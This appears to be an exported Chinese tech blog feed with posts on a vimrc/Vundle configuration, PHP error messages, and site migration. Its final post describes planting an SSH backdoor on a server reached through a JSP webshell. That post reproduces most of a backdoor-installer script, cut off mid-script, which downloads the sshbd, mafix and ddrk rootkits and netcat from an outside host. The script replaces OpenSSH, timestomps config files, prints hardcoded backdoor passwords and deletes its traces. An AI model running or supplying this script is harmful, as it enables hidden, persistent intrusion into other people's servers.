<p><span style="color: #ff0000;">autocmd! bufwritepost .vimrc source %</span></p>

<p><span style="color: #ff0000;">”———————插件相关————————-</span></p>

<p><span style="color: #ff0000;">“vundle插件管理器</span></p>

<p><span style="color: #ff0000;">set nocompatible “关闭vi兼容模式,vundle需求设置</span></p>

<p><span style="color: #ff0000;">filetype off “关闭文件类型检测,vundle需求设置</span></p>

<p><span style="color: #ff0000;">set rtp+=~/.vim/bundle/vundle/</span></p>

<p><span style="color: #ff0000;">call vundle#rc()</span></p>

<p><span style="color: #ff0000;">” 让Vundle管理自身</span></p>

<p><span style="color: #ff0000;">Bundle ‘gmarik/vundle’</span></p>

<p><span style="color: #ff0000;">“使用vundle管理的插件在下面声明:</span></p>

<p><span style="color: #ff0000;">” github上使用如下方式填写</span></p>

<p><span style="color: #ff0000;">“Bundle ‘tpope/vim-fugitive’</span></p>

<p><span style="color: #ff0000;">“Bundle ‘rstacruz/sparkup’, {‘rtp’: ‘vim/’}</span></p>

<p><span style="color: #ff0000;">Bundle “scrooloose/syntastic”</span></p>

<p><span style="color: #ff0000;">Bundle “Shougo/neocomplcache”</span></p>

<p><span style="color: #ff0000;">” vim-scripts上的插件按照下面方式填写</span></p>

<p><span style="color: #ff0000;">” 插件名可以在这里搜索[url=http://vim-scripts.org/vim/scripts.html]http://vim-scripts.org/vim/scripts.html[/url]</span></p>

<p><span style="color: #ff0000;">Bundle ‘The-NERD-tree’</span></p>

<p><span style="color: #ff0000;">Bundle ‘The-NERD-Commenter’</span></p>

<p><span style="color: #ff0000;">Bundle ‘fcitx.vim’</span></p>

<p><span style="color: #ff0000;">Bundle ‘colorizer’</span></p>

<p><span style="color: #ff0000;">Bundle ‘vim-javascript’</span></p>

<p><span style="color: #ff0000;">Bundle ‘taglist.vim’</span></p>

<p><span style="color: #ff0000;">Bundle ‘sgmlendtag’</span></p>

<p><span style="color: #ff0000;">Bundle ‘EasyMotion’</span></p>

<p><span style="color: #ff0000;">“其他的插件按照下面方式填写</span></p>

<p><span style="color: #ff0000;">“Bundle ‘git://git.wincent.com/command-t.git’</span></p>

<p><span style="color: #ff0000;">Bundle ‘https://github.com/Lokaltog/vim-powerline.git’</span></p>

<p><span style="color: #ff0000;">filetype plugin indent on “根据文件类型启用插件,vundle需求设置</span></p>

<p><span style="color: #ff0000;">“vundle使用方法:</span></p>

<p><span style="color: #ff0000;">” :BundleList - 列出已声明的插件</span></p>

<p><span style="color: #ff0000;">” :BundleInstall(!) - 安装(更新)插件</span></p>

<p><span style="color: #ff0000;">” :BundleSearch(!) foo - 搜索插件(或先刷新缓存)</span></p>

<p><span style="color: #ff0000;">” :BundleClean(!) - 清除不在声明列表中插件</span></p>

<p><span style="color: #ff0000;">”</span></p>

<p><span style="color: #ff0000;">” 输入:h vundle查看更多帮助文档与细节</span></p>

<p><span style="color: #ff0000;">” NOTE: comments after Bundle command are not allowed..</span></p>

<p><span style="color: #ff0000;">“vim-powerline配置(状态栏扩展)</span></p>

<p><span style="color: #ff0000;">set laststatus=2</span></p>

<p><span style="color: #ff0000;">set t_Co=256</span></p>

<p><span style="color: #ff0000;">let g:Powerline_symbols = ‘unicode’</span></p>

<p><span style="color: #ff0000;">“NERDTree”</span></p>

<p><span style="color: #ff0000;">“F4打开/关闭NERDtree插件</span></p>

<p><span style="color: #ff0000;">map :NERDTreeToggle</span></p>

<p><span style="color: #ff0000;">“imap :NERDTreeToggle</span></p>

<p><span style="color: #ff0000;">“The-NERD-Commenter</span></p>

<p><span style="color: #ff0000;">let mapleader=”,” “改变默认’'键，将其改映射为’,’键</span></p>

<p><span style="color: #ff0000;">“普通模式下：</span></p>

<p><span style="color: #ff0000;">” ,cc 注释当前行</span></p>

<p><span style="color: #ff0000;">” ,cs 以”性感”的方式注释</span></p>

<p><span style="color: #ff0000;">” ,cu 取消注释</span></p>

<p><span style="color: #ff0000;">” ,ca 在可选的注释方式之间切换，比如C/C++ 的块注释/* */和行注释//</span></p>

<p><span style="color: #ff0000;">” ,cm 添加块注释</span></p>

<p><span style="color: #ff0000;">” ,cA 当前行未添加注释符号</span></p>

<p><span style="color: #ff0000;">” colorizer</span></p>

<p><span style="color: #ff0000;">” 普通模式下输入 ,tc 开启/关闭CSS中显示颜色</span></p>

<p><span style="color: #ff0000;">“javascript</span></p>

<p><span style="color: #ff0000;">let b:javascript_fold=1 “ 打开javascript折叠</span></p>

<p><span style="color: #ff0000;">let javascript_enable_domhtmlcss=1 “ 打开javascript对dom、html和css的支持</span></p>

<p><span style="color: #ff0000;">” syntastic(一个非常好用的多语言的语法与编码风格检查插件)</span></p>

<p><span style="color: #ff0000;">let g:syntastic_auto_jump=1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_check_on_open = 1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_error_symbol = ‘✗’</span></p>

<p><span style="color: #ff0000;">let g:syntastic_warning_symbol = ‘⚠’</span></p>

<p><span style="color: #ff0000;">let g:syntastic_auto_loc_list = 1</span></p>

<p><span style="color: #ff0000;">let g:syntastic_loc_list_height = 6</span></p>

<p><span style="color: #ff0000;">let g:syntastic_enable_highlighting = 0</span></p>

<p><span style="color: #ff0000;">“Taglist(按F3启动代码浏览)</span></p>

<p><span style="color: #ff0000;">nmap :Tlist</span></p>

<p><span style="color: #ff0000;">let Tlist_Use_Right_Window=1</span></p>

<p><span style="color: #ff0000;">let Tlist_Exit_OnlyWindow = 1</span></p>

<p><span style="color: #ff0000;">let Tlist_Show_One_File = 1</span></p>

<p><span style="color: #ff0000;">let Tlist_Use_SingleClick=1</span></p>

<p><span style="color: #ff0000;">“easymotion(快速一定光标)</span></p>

<p><span style="color: #ff0000;">let g:EasyMotion_leader_key = ‘’</span></p>

<p><span style="color: #ff0000;">“双空格+w出现行关键字字母然后快速跳跃</span></p>

<p><span style="color: #ff0000;">“neocomplcache(自动补全插件)</span></p>

<p><span style="color: #ff0000;">” 启动vim时开启neocomplcache.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_at_startup = 1</span></p>

<p><span style="color: #ff0000;">” Use smartcase.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_smart_case = 1</span></p>

<p><span style="color: #ff0000;">” Set minimum syntax keyword length.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_min_syntax_length = 3</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_lock_buffer_name_pattern = ‘*ku*’</span></p>

<p><span style="color: #ff0000;">” Enable heavy features.</span></p>

<p><span style="color: #ff0000;">” Use camel case completion.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_camel_case_completion = 1</span></p>

<p><span style="color: #ff0000;">” Use underbar completion.</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_enable_underbar_completion = 1</span></p>

<p><span style="color: #ff0000;">” Define keyword.</span></p>

<p><span style="color: #ff0000;">if !exists(‘g:neocomplcache_keyword_patterns’)</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_keyword_patterns = {}</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_keyword_patterns[‘default’] = ‘\h\w*’</span></p>

<p><span style="color: #ff0000;">” Enable omni completion.</span></p>

<p><span style="color: #ff0000;">autocmd FileType css setlocal omnifunc=csscomplete#CompleteCSS</span></p>

<p><span style="color: #ff0000;">autocmd FileType html,markdown setlocal omnifunc=htmlcomplete#CompleteTags</span></p>

<p><span style="color: #ff0000;">autocmd FileType javascript setlocal omnifunc=javascriptcomplete#CompleteJS</span></p>

<p><span style="color: #ff0000;">autocmd FileType python setlocal omnifunc=pythoncomplete#Complete</span></p>

<p><span style="color: #ff0000;">autocmd FileType xml setlocal omnifunc=xmlcomplete#CompleteTags</span></p>

<p><span style="color: #ff0000;">autocmd FileType ruby setlocal omnifunc=rubycomplete#Complete</span></p>

<p><span style="color: #ff0000;">” Enable heavy omni completion.</span></p>

<p><span style="color: #ff0000;">if !exists(‘g:neocomplcache_omni_patterns’)</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns = {}</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.ruby = ‘[^. <em>\t].\h\w</em>|\h\w*::’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.php = ‘[^. \t]-&gt;\h\w<em>|\h\w</em>::’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.c = ‘[^.[:digit:] *\t]\%(.|-&gt;)’</span></p>

<p><span style="color: #ff0000;">let g:neocomplcache_omni_patterns.cpp = ‘[^.[:digit:] <em>\t]\%(.|-&gt;)|\h\w</em>::’</span></p>

<p><span style="color: #ff0000;">”——————–自定义功能————————–</span></p>

<p><span style="color: #ff0000;">“F8/F9开启/关闭粘贴模式(粘贴代码时避免自动缩进)</span></p>

<p><span style="color: #ff0000;">map :set paste</span></p>

<p><span style="color: #ff0000;">map :set nopaste</span></p>

<p><span style="color: #ff0000;">“新建.c,.h,.sh,.java文件，自动插入文件头</span></p>

<p><span style="color: #ff0000;">autocmd BufNewFile <em>.cpp,</em>.[ch],<em>.sh,</em>.java,*.py exec “:call SetTitle()”</span></p>

<p><span style="color: #ff0000;">"”定义函数SetTitle，自动插入文件头</span></p>

<p><span style="color: #ff0000;">func SetTitle()</span></p>

<p><span style="color: #ff0000;">“如果文件类型为.sh文件</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘sh’</span></p>

<p><span style="color: #ff0000;">call setline(1,”#########################################################################”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”), “# File Name: “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “# Author: 这里修改为您的名字”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+2, “# mail: 这里修改为您的邮箱”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+3, “# Created Time: “.strftime(“%c”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+4, “#########################################################################”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+5, “#!/bin/bash”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “”)</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘python’</span></p>

<p><span style="color: #ff0000;">call setline(1,”#!/usr/bin/env python”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”),”#coding=utf-8”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “”)</span></p>

<p><span style="color: #ff0000;">else</span></p>

<p><span style="color: #ff0000;">call setline(1, “/<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>*”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”), “ &gt; File Name: “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+1, “ &gt; Author: 这里修改为您的名字”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+2, “ &gt; Mail: 这里修改为您的邮箱 “)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+3, “ &gt; Created Time: “.strftime(“%c”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+4, “ <strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>/”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+5, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘cpp’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “#include”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7, “using namespace std;”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+8, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘c’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6, “#include”)</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7, “”)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘java’</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+6,”public class “.expand(“%”))</span></p>

<p><span style="color: #ff0000;">call append(line(“.”)+7,””)</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p><span style="color: #ff0000;">“新建文件后，自动定位到文件末尾</span></p>

<p><span style="color: #ff0000;">autocmd BufNewFile * normal G</span></p>

<p><span style="color: #ff0000;">“C/C++/shell脚本/Python/Java/html按F5自动编译/运行</span></p>

<p><span style="color: #ff0000;">map :call AutoCompileRun()</span></p>

<p><span style="color: #ff0000;">func! AutoCompileRun()</span></p>

<p><span style="color: #ff0000;">exec “w”</span></p>

<p><span style="color: #ff0000;">if &amp;filetype == ‘c’</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!time ./%&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘cpp’</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!time ./%&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘sh’</span></p>

<p><span style="color: #ff0000;">:!time bash %</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘python’</span></p>

<p><span style="color: #ff0000;">exec “!time python2.7 %”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘java’</span></p>

<p><span style="color: #ff0000;">exec “!javac %”</span></p>

<p><span style="color: #ff0000;">exec “!time java %&lt;”</span></p>

<p><span style="color: #ff0000;">elseif &amp;filetype == ‘html’</span></p>

<p><span style="color: #ff0000;">exec “!firefox % &amp;”</span></p>

<p><span style="color: #ff0000;">endif</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p><span style="color: #ff0000;">“C/C++按F6使用GDB进行调试</span></p>

<p><span style="color: #ff0000;">map :call Rungdb()</span></p>

<p><span style="color: #ff0000;">func! Rungdb()</span></p>

<p><span style="color: #ff0000;">exec “w”</span></p>

<p><span style="color: #ff0000;">exec “!g++ % -g -o %&lt;”</span></p>

<p><span style="color: #ff0000;">exec “!gdb ./%&lt;”</span></p>

<p><span style="color: #ff0000;">endfunc</span></p>

<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p>配置问题：楼主在配置时遇到以下几个问题。
第一：git
由于博主采用的是centos，默认没装git。而vim中的插件管理器Vundle，最方便的方法是git安装。然后楼主在网上查了下，一大堆，为了省事，发现直接yum install git即可，查看git –version,得到版本，安装成功。
第二：安装Vundle
git clone http://github.com/gmarik/vundle.git ~/.vim/bundle/vundle 即可。这个主要是配置vimrc时用到，vimrc是更改vim所需，配置文件可放在github上。
第三：配置文件作者的小问题
据发布这个配置的网友所说，复制配置文件.vimrc到用户目录后，要进入vim命令模式:BundleInstall，才能更新写入配置，但不知道是因为root权限或者centos系统本身还是其他神马的缘故，并不用更新，直接可用。暗自揣测可能是配置文件本身直接更新了的缘故吧。
第四：关于配置文件格式的整改
由于部分github上程序猿开发的跨平台性并不是特好，诸多异处，比如换行符。在win下开发的拿到linux下用各种出错，我们可以采用dos2unix转换下格式，（在centos下没有好像默认安装，附上链接：
<a href="http://blog.csdn.net/bluewhale1/article/details/8074978">http://blog.csdn.net/bluewhale1/article/details/8074978</a>。</p>

<p>补充一点 载入配置可用:BundleInstall</p>

<p>如：颜色配置文件在里，/usr/share/vim/vim71/colors/  中间那个vim71数字可能会不一样，视情况而定。</p>

<p>PS:推荐一篇vim配置的文章，朋友们可以diy喔。<a href="http://blog.chinaunix.net/uid-179573-id-2856644.html">http://blog.chinaunix.net/uid-179573-id-2856644.html</a>
vim是一款非常强大的编辑器，能改善程序猿码字调试时的错误率，大幅度提高速度，但需要较好的掌握语法和对其的熟练度，与君共勉！</p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（一）]]></title>
      <url>/coding/2013/07/11/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>以下只是摆弄PHP时遇到的一些小问题，朋友们看到有新的见解，忘不吝赐教。
PHP的几种常见报错：
1.Fatal error: Can’t use function return value in write context in ……这种情况一般是返回值问题，在即在返回值里面不能使用函数（function）返回值，而应该用获取返回值过后的变量中转替代。
2.Undefined offset: 1 in…..这种情况属于数组越界，有时候下标取值错误，或者正则匹配失误时，往往会造成这种情况。通常这种情况我会有两种做法，一是检查下标数，看看匹配正则有没有误判导致取错。二是选择了一种稍笨的方法，由于正则博大精深，不熟的话取的时候偶尔会出错，如果可以采用代替函数分割步奏执行，虽然效率稍低，仍不失为一种好方法。
3.preg_match() expects parameter 2 to be string, array given in……这种情况是使用取得的pre_match时,传入的变量并非string类型，造成这种可能有不少原因。如果只是取得值而类似不准可以用（string）强制转换传入的变量。而万一传入的变量并没有准确的取到值，则要依靠调试，echo，看看错误的缘由。                                                                                                                                               <br />
4.php中的Notice:undefine dindex以及Notice:Undefinedvariable:一般由于未声明变量而导致的，有时候系统环境变量也需要声明，可考虑使用 isset() 或者empty()进行预置值。</p>

<p>这里顺便一提，大公司的作风，除了实力强劲写的公司迅拥有猛的修补速度，还有部分公司喜欢这里有洞这里掩饰一下，那里有洞那里填补一下，导致了二次漏洞的产生。在这里笔者以为关闭报错也是种不错的方法，虽然有时候会影响web程序的运行。
补救方法下面稍稍列几项，也是从互联网采集而来，笔者做了些修改。
1.服务器配置修改
修改 php.ini 中的 error配置下错误显示方式：将error_reporting = E_ALL 修改为error_reporting = E_ALL &amp; ~E_NOTICE，改后重启下APACHE服务器，方可生效。
2.函数容错
在变量前面 加上一个 @ ，如 if (@$_GET[‘action’]==’save’)
3.变量初始化
程序猿养成一个好习惯，php定义变量很容易，但在定义时在记得考虑是否对变量进行容错初始化。
4.函数替代
时间比较紧的话，可以尝试用功能相似，而程序猿本身又相对熟悉的函数去替代不太了解函数。即使要花稍多时间写更长一段代码，也比事后多次修补和安全的不稳定性的代价交换更好。
5.禁止报错
在文件头部加上“error_reporting(E_ERROR | E_WARNING | E_PARSE);这是一剂狠药，如果交互性比较强的代码建议慎用。</p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于网站搬家和移植源码]]></title>
      <url>/tips/2013/07/09/e5-85-b3-e4-ba-8e-e7-bd-91-e7-ab-99-e6-90-ac-e5-ae-b6-e5-92-8c-e7-a7-bb-e6-a4-8d-e6-ba-90-e7-a0-81/</url>
      <content type="html"><![CDATA[<p>对于黑阔们和站长们来说，网站搬家和顺来的源码移植是个很常见的头疼问题，而数据备份和还原问题没解决好也会带来很多的麻烦。因此我们需要对此多做一些工作。</p>

<p>数据库:</p>

<table>
  <tbody>
    <tr>
      <td>以mysql为例子，常常备份为sql文件。然后在移植后，use 数据库名，source xxx.sql。这是比较方便的。 备份语句：mysqldump -uroot -p 密码 数据库名 &gt; xxx.sql </td>
      <td> </td>
      <td>mysqldump.exe  databasename -u root -p &gt; xxx.sql(导出了表结构和数据)###如果不方便操作数据库或者网站没有自带备份功能。可以考虑帝国备份王和phpMyadmin。在这里提醒一下，使用备份王服务器需要修改php.ini,打开short_open_tag ，设置为On。这是因为php语法中标签解析的问题，不然无法进入修改配置和访问,修改完以后重启Apache即可。有时候需要涉及到修改目录权限，chmod -R 777 xxx，递归至子目录。至于mssql里面也有专门的语句可以备份，sqlsever系统自带的管理和导入导出数据显得更加强大。</td>
    </tr>
  </tbody>
</table>

<p>源码：</p>

<p>服务器上打包源码的话，假设非独立vps类，如果控制面板有功能优选控制面板，Linux下常用tar命令或者rar直接打包目录，部分大马有自带打包功能。Win下可以Winrar，即C:\progra~1\WinRAR\Rar.exe a -k -r -s -m1 D:\1.rar  D:\www，只要可以执行cmd命令不需要系统权限也可以使用另外注意在cmd下输入“<span style="font-family: Verdana;">C:\Program Files\”是不行的，因为有个空格，要用c:\progra~1\代替，</span>至于博客之类的打包就直接把图片下下来即可替换，毕竟大站升级和改动文件较多。</p>

]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SSH连接引发的血案]]></title>
      <url>/system/2013/07/02/ssh-e8-bf-9e-e6-8e-a5-e5-bc-95-e5-8f-91-e7-9a-84-e8-a1-80-e6-a1-88/</url>
      <content type="html"><![CDATA[<p>今天干了特脑残的一件事，机油丢我一jsp的shell。我试图帮他留一个ssh后门。 但是 光看了shell的提示的ip，有两个，都是公网地址。于是乎小弟很自然的认为其为公网独立IP。不过连接时总是超时。于是做了以下两件事：</p>

<p>1.service iptables stop     </p>

<p>2.service sshd restart  或者  ssh./etc/init.d/sshd restart</p>

<p>具体就是重启服务，关闭防火墙。   可是如此做以后还是发现connection  timeout。怎么办？又考虑了一个办法 ，      修改server端 的 /etc/ssh/sshd_config ClientAliveInterval设置为60，ClientAliveCountMax设置为3，至于Client端，ServerAliveInterval和  ServerAliveCountMax设置为类似。</p>

<p>附上ssh后门连接方法，</p>

<p>参考链接：</p>

<p><a href="http://www.cnblogs.com/fnng/archive/2012/02/21/2362013.html">http://www.cnblogs.com/fnng/archive/2012/02/21/2362013.html</a>  PUTTY直接连接用户</p>

<p>或者用xshell—&gt; ssh <a href="mailto:root@192.168.1.146">root@192.168.1.146</a>填入用户名输入密码</p>

<p><a href="http://blog.163.com/lgh_2002/blog/static/44017526201011333227161/">http://blog.163.com/lgh_2002/blog/static/44017526201011333227161/</a>      SSH后门</p>

<p>参考linux后门速成shell脚本：</p>

<p>++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p><span style="color: #ff0000;">#!/bin/bash</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">clear</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo -e “\033[1;035m \n”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘###############################’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#—————————–#’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#   WelCome to [url]www.90sec.org[/url]  #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#         hello I is helen    #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#           By:Mr,PriNce      #’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘#—————————–#’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo ‘###############################’</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [ $(id -u) != 0 ];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo sorry,!root….</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit 1</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -gt 4 ]] || [[ $1 == “” ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “###############################”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#—————————–#”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      1:sshbd backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      2:mafix backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#      3:ddrk  backdoor       #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#         4:Netcat            #”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “#—————————–#”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “###############################”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh1=”<a href="http://www.gome.com.hk/attachment/mc/sshbd.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/sshbd.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh2=”<a href="http://www.gome.com.hk/attachment/mc/mafix.tar.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/mafix.tar.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh3=”<a href="http://www.gome.com.hk/attachment/mc/ddrk-rootkit.tar"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/ddrk-rootkit.tar</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">ssh4=”<a href="http://www.gome.com.hk/attachment/mc/netcat.tar.gz"><span style="color: #ff0000;">http://www.gome.com.hk/attachment/mc/netcat.tar.gz</span></a>”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">dir=”/tmp/”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 1 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">port=$(grep Port /etc/ssh/sshd_config)</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Current ssh $port”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p Enter:</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh1 -O $dir/sshbd.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf sshbd.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd openssh</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./configure –prefix=/usr –sysconfdir=/etc/ssh</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">make &amp;&amp; make install</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">/etc/init.d/sshd restart</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo Current ssh $port</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “sshbd backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Username:root Password:995430aaa”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/openssh /tmp/sshbd*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 2 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh2 -O $dir/mafix.tar.gz</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar zxvf mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p “Enter Backdoor Passwords:” ID</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">read -p “Enter Backdoor ssh Port:” back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./root $ID $back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “mafix backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Current Port:” $back</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/mafix*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">exit</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">fi</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">if [[ $1 -eq 3 ]];then</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">wget $ssh3 -O $dir/ddrk-rootkit.tar</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd $dir</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">tar xvf ddrk-rootkit*</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">cd ddrk</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">./setup</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “ddrk backdoor install ok”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Username:root Passwords:123456”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">echo “Port:43958”</span>
<span style="color: #ff0000;"> </span>
<span style="color: #ff0000;">rm -rf /tmp/ddrk*</span>
